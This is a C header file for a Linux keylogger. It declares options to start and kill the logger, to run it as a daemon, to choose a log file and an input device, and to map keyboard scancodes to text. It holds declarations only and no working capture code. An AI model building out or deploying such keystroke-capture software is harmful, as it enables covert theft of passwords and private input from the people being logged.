#ifndef __KEYLOGGER_H
#define __KEYLOGGER_H
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <signal.h>
#include <string.h>
#include <fcntl.h>
#include <linux/input.h>

#define INFO(...) printf(__VA_ARGS__)
#define UK "[Unknown]"

enum ops{NONE, START, KILL, HELP};

typedef struct arguments{
  enum ops operation;
  char * arg_log;
  char * arg_dev;
  int arg_daemon_flag; // 0: have daemon, 1: not have daemon
}arguments;

typedef struct device_info{
  char name[256];
  int event_id;
  int ev;
}device_info;

arguments parse_args(int argc, char ** argv);
void handle_error(FILE* __stream, unsigned short error_id);
void print_usage(FILE* __stream);

void start_logging(arguments args);
void kill_daemon();

pid_t check_running(char* process_name);

//mappings
extern char* normal_scancode_to_ascii[];
extern char* shift_scancode_to_ascii[];
extern char* caps_scancode_to_ascii[];
extern char * shift_caps_scancode_to_ascii[];
#define MAX_KEYV_LEN 12

extern char * pid_file;

#endif